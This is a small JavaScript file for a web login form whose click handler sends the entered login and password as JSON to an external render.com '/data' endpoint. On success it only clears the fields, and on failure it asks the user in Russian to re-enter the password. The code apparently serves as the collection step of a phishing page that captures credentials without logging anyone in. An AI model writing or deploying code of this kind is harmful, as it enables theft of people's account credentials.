let inps = document.querySelectorAll('.form-control')
let btn = document.querySelector('.btn')
let mistake = document.querySelector('#eror_message')
let regex = /^.{6,}$/
let regextwo = /^.$/

// this is dizayn

/*
inps.forEach(elem => {
                
                if (regex.test(elem.value)) {
                    elem.classList.remove('eror')
                    mistake.textContent = ''
                    elem.value = ''
                    inps[0].value = data.login
                    inps[1].value = data.password
                } else {
                    elem.classList.add('eror')
                    mistake.textContent = `
                Пожалуйста, введите свой пароль и войдите в систему полностью
                `
                }

            })
            */


inps[1].addEventListener('keyup', (e) => {
    if (regex.test(inps[1].value)) {
        btn.classList.remove('key')
    } else {
        btn.classList.add('key')
    }
})



btn.addEventListener('click', (e) => {
    fetch('https://backend-f6fz.onrender.com/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            login: inps[0].value,
            password: inps[1].value
        })
    })
        .then(res =>{
            if(res.status===201){
                inps[0].value=''
                inps[1].value=''
            }else{
                alert('xatolik yuzaga keldi')
            }
        })
       
        .catch(er => {
            mistake.textContent = `
            Пожалуйста, введите свой пароль и войдите в систему полностью
            `
            alert('error')
        })
})






